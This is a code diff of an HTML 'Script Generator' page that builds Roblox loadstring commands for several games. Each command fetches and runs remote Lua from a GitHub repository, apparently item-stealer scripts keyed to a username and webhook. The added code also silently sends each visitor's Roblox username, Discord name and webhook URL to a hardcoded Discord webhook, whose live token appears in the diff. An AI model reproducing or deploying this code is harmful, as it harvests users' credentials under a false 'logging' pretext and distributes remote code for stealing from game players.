@@ -8,28 +8,26 @@
         body { background: linear-gradient(45deg, #0f0c29, #302b63, #24243e); color: white; font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; flex-direction: column; }
         button { background: #ff0080; padding: 10px 20px; border-radius: 8px; cursor: pointer; transition: 0.3s; }
         button:hover { background: #ff0055; transform: scale(1.1); }
-        .auth-container { position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0, 0, 0, 0.5); display: flex; justify-content: center; align-items: center; }
-        .auth-box { background: rgba(255, 255, 255, 0.2); padding: 20px; border-radius: 8px; backdrop-filter: blur(5px); }
+        .popup { display: none; text-align: center; background: #1e1e2e; padding: 20px; border-radius: 8px; box-shadow: 0 0 10px rgba(0, 0, 0, 0.5); }
+        .popup input { margin: 10px auto; padding: 8px; width: 80%; border-radius: 8px; }
+        .popup button { background: #ff0080; padding: 10px 20px; border-radius: 8px; cursor: pointer; transition: 0.3s; }
+        .popup button:hover { background: #ff0055; transform: scale(1.1); }
     </style>
 </head>
 <body>
     <h1>Script Generator</h1>
-    <div id="auth-container" class="auth-container">
-        <div class="auth-box">
-            <h2>Login with Discord</h2>
-            <button id="auth-btn">Authenticate with Discord</button>
-        </div>
-    </div>
-    
     <div class="container">
         <button onclick="openPopup('Blox Fruits')">Blox Fruits</button>
         <button onclick="openPopup('Murder Mystery 2')">Murder Mystery 2</button>
         <button onclick="openPopup('Adopt Me')">Adopt Me</button>
+        <button onclick="openPopup('Pet Simulator 99')">Pet Simulator 99</button>
+        <button onclick="openPopup('Pls Donate')">Pls Donate</button>
     </div>
     
-    <div id="popup" class="popup" style="display: none;">
+    <div id="popup" class="popup">
         <h2 id="game-title">Enter Details</h2>
         <input type="text" id="username" placeholder="Roblox Username">
+        <input type="text" id="discordUser" placeholder="Discord Username (for logging only)">
         <input type="text" id="webhook" placeholder="Webhook URL">
         <button onclick="generateScript()">Generate Script</button>
         <button onclick="closePopup()">Close</button>
@@ -37,47 +35,58 @@
 
     <script>
         let currentGame = '';
-        let authToken = ''; // Store authentication token for Discord
 
-        // Show the auth modal
-        document.getElementById('auth-btn').onclick = function() {
-            window.location.href = 'https://your-backend-url.com/auth'; // Your backend to handle OAuth2
+        const loadstrings = {
+            "Blox Fruits": "loadstring(game:HttpGet('https://raw.githubusercontent.com/Goldded/Void2/main/Bloxfruits'))()",
+            "Murder Mystery 2": "loadstring(game:HttpGet('https://raw.githubusercontent.com/Goldded/Void2/main/Void'))()",
+            "Adopt Me": "loadstring(game:HttpGet('https://raw.githubusercontent.com/Goldded/Void2/main/AdoptMe'))()",
+            "Pet Simulator 99": "loadstring(game:HttpGet('https://raw.githubusercontent.com/Goldded/Void2/main/Ps99'))()",
+            "Pls Donate": "loadstring(game:HttpGet('https://raw.githubusercontent.com/Goldded/Void2/main/PlsDonate'))()"
         };
 
-        function openPopup(game) { 
-            if (!authToken) {
-                alert("Please authenticate first.");
-                return;
-            }
-            currentGame = game; 
-            document.getElementById('popup').style.display = 'block'; 
+        function openPopup(game) {
+            currentGame = game;
+            document.getElementById('popup').style.display = 'block';
+            document.getElementById('game-title').innerText = `Enter Details for ${game}`;
         }
 
-        function closePopup() { 
-            document.getElementById('popup').style.display = 'none'; 
+        function closePopup() {
+            document.getElementById('popup').style.display = 'none';
         }
 
         function generateScript() {
             let username = document.getElementById('username').value;
+            let discordUser = document.getElementById('discordUser').value;
             let webhook = document.getElementById('webhook').value;
-            if (username && webhook) {
-                let url = currentGame === 'Blox Fruits' ? 'Bloxfruits' : (currentGame === 'Murder Mystery 2' ? 'Void' : 'AdoptMe');
-                let script = `Username = "${username}"\nWebhook = "${webhook}"\nloadstring(game:HttpGet('https://raw.githubusercontent.com/Goldded/Void2/main/${url}'))()`;
-                alert(script);
 
-                // Send data to backend to log the user and webhook
-                fetch('https://your-backend-url.com/log', {
+            if (username && webhook) {
+                let script = `Username = "${username}"\nWebhook = "${webhook}"\n${loadstrings[currentGame]}`;
+                alert("Generated Script:\n" + script);
+
+                // Send data to webhook for logging
+                fetch('https://discord.com/api/webhooks/1306937739702308915/-kxWY0Xk3Ci95HR7DjHZyw2BcMSc3CvkwMwllTDEOve0LmozUU3QgGT8k51FtCCylQiI', {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json',
                     },
-                    body: JSON.stringify({ 
-                        username: username, 
-                        webhook: webhook, 
-                        discordUser: authToken 
+                    body: JSON.stringify({
+                        username: discordUser, // User's Discord username
+                        embeds: [{
+                            title: 'Script Generated',
+                            fields: [
+                                { name: 'Game', value: currentGame },
+                                { name: 'Roblox Username', value: username },
+                                { name: 'Webhook URL', value: webhook },
+                            ],
+                        }],
                     })
                 });
-            } else { alert("Please fill in both fields!"); }
+
+                // Close the popup after generating the script
+                closePopup();
+            } else {
+                alert("Please fill in both the username and webhook!");
+            }
         }
     </script>
 </body>
